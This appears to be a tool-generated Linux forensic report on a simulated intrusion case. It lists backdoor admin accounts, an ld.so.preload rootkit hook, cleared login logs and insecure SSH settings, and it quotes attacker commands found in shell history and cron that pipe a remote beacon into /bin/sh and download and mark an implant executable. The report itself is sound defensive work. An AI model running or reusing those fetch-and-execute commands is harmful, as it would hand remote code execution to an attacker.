Summary

Examination of case CASE-ENTERPRISE-SIM identified 27 high-severity finding(s) and 8 medium-severity indicator(s) across 62,117 normalised events. The evidence points to targeted activity or a significant misconfiguration, and warrants immediate review.

27 High
8 Medium
12 Low
62,117 Events

Key observations

  • Account kali was created and given administrator rights

    The account kali was created at 2026-05-26 10:23 and was given administrator rights at 2026-05-26 10:23.

    Creating an account and immediately promoting it to administrator is how an intruder keeps access after the way they originally got in is closed. Legitimate account creation is usually separated from privilege changes by a ticket and some time.

  • Account backdooruser was created and given administrator rights

    The account backdooruser was created at 2026-08-26 20:44 and was given administrator rights at 2026-08-26 20:44.

    Creating an account and immediately promoting it to administrator is how an intruder keeps access after the way they originally got in is closed. Legitimate account creation is usually separated from privilege changes by a ticket and some time.

  • Account postgres was created and given administrator rights

    The account postgres was created at 2026-11-09 07:47 and was given administrator rights at 2026-11-09 07:47.

    Creating an account and immediately promoting it to administrator is how an intruder keeps access after the way they originally got in is closed. Legitimate account creation is usually separated from privilege changes by a ticket and some time.

  • Suspicious command executed: curl -s http://203.0.113.9/beacon | /bin/sh

    A process matching a known malicious command shape was seen: curl -s http://203.0.113.9/beacon | /bin/sh

    A command matching a reverse-shell, C2-beacon or encoded-payload pattern was executed. Even without a matching login it does not belong in normal operation and must be explained. Note the source: shell history records what was typed at an interactive shell, not what the kernel actually ran, and the account owner can edit or wipe it. Treat this as a lead to confirm rather than proof that the command executed.

  • Suspicious command executed: wget http://198.51.100.7/implant.bin -O /tmp/.x && chmod +x /tmp/.x

    A process matching a known malicious command shape was seen: wget http://198.51.100.7/implant.bin -O /tmp/.x && chmod +x /tmp/.x

    A command matching a reverse-shell, C2-beacon or encoded-payload pattern was executed. Even without a matching login it does not belong in normal operation and must be explained. Note the source: shell history records what was typed at an interactive shell, not what the kernel actually ran, and the account owner can edit or wipe it. Treat this as a lead to confirm rather than proof that the command executed.

Recommended next steps

  1. Ask whether kali was requested by anyone, and check who was logged in at the time it was created. If nobody claims it, disable the account rather than deleting it, so the evidence survives.
  2. Ask whether backdooruser was requested by anyone, and check who was logged in at the time it was created. If nobody claims it, disable the account rather than deleting it, so the evidence survives.
  3. Ask whether postgres was requested by anyone, and check who was logged in at the time it was created. If nobody claims it, disable the account rather than deleting it, so the evidence survives.
  4. Corroborate the history entry against a second artifact - auditd execve records, journald, or an outbound connection to the address in the command - before relying on it, and confirm which user's history file it came from.
  5. Ask whether admin_mike was requested by anyone, and check who was logged in at the time it was created. If nobody claims it, disable the account rather than deleting it, so the evidence survives.

Finding d918a332e360354894ea6041561cfc03 · Rule new_account_privilege_grant v1.0 · 2026-11-09T07:47:20.573171+00:00 · host 5e91118635724e4ba187e0e1e063b8f2 · 2 supporting event(s)

HIGH

Suspicious command executed: curl -s http://203.0.113.9/beacon | /bin/sh

What happened
A process matching a known malicious command shape was seen: curl -s http://203.0.113.9/beacon | /bin/sh
Why it matters
A command matching a reverse-shell, C2-beacon or encoded-payload pattern was executed. Even without a matching login it does not belong in normal operation and must be explained. Note the source: shell history records what was typed at an interactive shell, not what the kernel actually ran, and the account owner can edit or wipe it. Treat this as a lead to confirm rather than proof that the command executed.
Confidence
Medium
What to check next
Corroborate the history entry against a second artifact - auditd execve records, journald, or an outbound connection to the address in the command - before relying on it, and confirm which user's history file it came from.
Technical detail

rule=suspicious_process v1.1; matched command 'curl -s http://203.0.113.9/beacon | /bin/sh' in shell_command [root/.bash_history]; sources=shell history; occurrences=1

Suspicious command executed: /bin/sh -c curl -s http://203.0.113.9/beacon | sh

What happened
A process matching a known malicious command shape was seen: /bin/sh -c curl -s http://203.0.113.9/beacon | sh
Why it matters
A process matching a reverse-shell or C2 pattern was running when evidence was collected. It has no execution timestamp (captured from the live process list), so it cannot be placed on the timeline - confirm it directly.
Confidence
Medium
What to check next
Confirm the parent process and the user that launched it, check for an outbound connection to the address in the command, and preserve the binary before removing it - it is evidence.

Finding 2ad089917d3ea073d5dfeeaf65cf85af · Rule suspicious_process v1.1 · host 5e91118635724e4ba187e0e1e063b8f2 · 4 supporting event(s)

HIGH

Login record file var/log/lastlog is empty

What happened
The file var/log/lastlog, which the system uses to record logins, exists but contains no usable records, even though 83 logins are recorded elsewhere in the logs.
Why it matters
Clearing these files is a standard way of hiding that someone logged in. They are binary, so they are usually emptied rather than edited.
Confidence
High
What to check next
Compare against the same file's rotated copies and against the journal, which records logins separately. If the journal shows logins the binary file does not, the file was cleared.
Technical detail

rule=zero_length_login_log v1.0; artifact=var/log/lastlog; parser finding=lastlog_absent_or_empty; corroborating login events elsewhere in the case=83; detail=lastlog file is empty or contains no records

Finding 34afed8f0c59dded7739d4a9cbfb443b · Rule zero_length_login_log v1.0 · host 5e91118635724e4ba187e0e1e063b8f2 · 1 supporting event(s)

HIGH

Login record file var/log/btmp.1 is empty

What happened
The file var/log/btmp.1, which the system uses to record logins, exists but contains no usable records, even though 83 logins are recorded elsewhere in the logs.
Why it matters

Technical detail

rule=zero_length_login_log v1.0; artifact=var/log/btmp.1; parser finding=utmp_empty; corroborating login events elsewhere in the case=83; detail=var/log/btmp.1 exists but is zero-length: no login records at all. On a machine with recorded sessions this indicates the file was cleared.

Finding 486f3db94c1c958363a4ef2dc16d6af2 · Rule zero_length_login_log v1.0 · host 5e91118635724e4ba187e0e1e063b8f2 · 1 supporting event(s)

HIGH

Suspicious dynamic linker preload library configured

What happened
/etc/ld.so.preload is configured to preload shared libraries into all executed processes
Why it matters
ld.so.preload is commonly utilized by Linux rootkits to hook libc calls and conceal files, network connections, and processes.
Confidence
High
What to check next
Examine the referenced preload shared library and verify integrity of core system binaries.
Technical detail

Dynamic linker preload active: /etc/ld.so.preload forces the dynamic linker to preload '/lib/x86_64-linux-gnu/libselinux.so.1' into every executed process - a classic rootkit hook used to hide files, processes and connections

Finding 5ce996346dbf8599432afe100ac1d4c1 · Rule ld_preload_rootkit v1.0 · host 5e91118635724e4ba187e0e1e063b8f2 · 1 supporting event(s)

HIGH

Suspicious command run from cron: curl -s http://203.0.113.9

What happened
A cron task running as backdooruser executes a command matching a known malicious shape: curl -s http://203.0.113.9. A cron entry is in place to run it on a schedule.
Why it matters
A scheduled task that beacons out or pipes a download into a shell is how an intruder keeps code running after a reboot without ever logging back in. Because it is in cron it fires on a timer, unattended, as whatever user the entry names - here typically root.

Finding 95473a5f52e93012c39a43616b7dd5de · Rule suspicious_cron v1.0 · host 5e91118635724e4ba187e0e1e063b8f2 · 3 supporting event(s)

HIGH

Insecure SSH configuration: PermitEmptyPasswords yes

What happened
PermitEmptyPasswords yes - accounts with an empty password may log in over SSH without any credential
Why it matters
An over-permissive SSH daemon widens the network attack surface: direct root login, empty passwords, or password authentication all let an attacker in over the network, often with no user attribution.
Confidence
High
What to check next
Harden /etc/ssh/sshd_config: set PermitRootLogin no, PermitEmptyPasswords no, prefer key-based authentication, then restart sshd.
Technical detail

Insecure sshd configuration detected: PermitEmptyPasswords yes - accounts with an empty password may log in over SSH without any credential

MEDIUM

Timestamps run backwards inside var/log/auth.log

What happened
In var/log/auth.log, 2 line(s) are dated earlier than the line above them - for example a line at 2026-11-09 21:41:55 follows one at 2026-11-09 22:14:07.
Why it matters
Log files are written in order, so time should only move forwards within one file. Going backwards means the system clock was changed, or lines were inserted or removed by hand. It also means timestamps around that point cannot be compared safely.
Confidence
High
What to check next
Look for clock-change records around that time, and check whether NTP was reconfigured. Treat the ordering of events in this file as unreliable until explained.
Technical detail

Appendix A — Methodology, limitations and tool audit

How this report was produced

  1. Artifacts were collected read-only on the target. Each file was stat'd, copied, and the copy hashed; the source was stat'd again so that growth during collection is recorded as an observation, not an error.
  2. At ingest every file was re-hashed against the collection manifest. Mismatches were quarantined and excluded from analysis.
  3. Parsers translated each artifact into normalised events. A parser that fails does so alone; the run continues and the failure is recorded.
  4. Correlation rules ran over the normalised events. Every rule is explainable: it names its threshold and the exact events it fired on. No machine learning is used anywhere in this tool.

Coverage

152 artifact(s) were recorded. 126 parsed successfully, 26 had no parser that claimed them, and 0 failed during parsing.

Appendix B — What we could not determine

Absence of evidence is itself evidence, and stating it plainly is part of an honest examination.

  • 26 collected artifact(s) had no parser that claimed them. Their contents were not analysed.
  • This examination sees only what the collector captured. Anything an intruder deleted before collection, or that was never written to disk, is outside its reach.
  • Timestamps carrying a confidence of year_inferred were reconstructed from file modification times, because classic syslog lines record no year.

Appendix C — Glossary

Artifact
A file or command output collected from the target host.
Normalised event
One record parsed from an artifact into the tool's common schema, so that evidence from different sources can be compared on a single timeline.
Finding
A correlation rule firing on specific events. A finding is an indicator for a human to judge, not a conclusion.
Confidence
How strongly the evidence supports a finding: High, Medium or Low.
Chain of custody
The record proving evidence has not changed since collection: a hash taken at collection and re-verified at ingest.
Quarantined
An artifact whose hash did not match the manifest. It was excluded from analysis because anything derived from it would be unattributable.
Tool-generated
An event caused by the collection itself, tagged so the tool does not report its own operator as suspicious activity.

Generated by Linux Forensic Analyzer. Findings are indicators for a human examiner to judge, not conclusions.
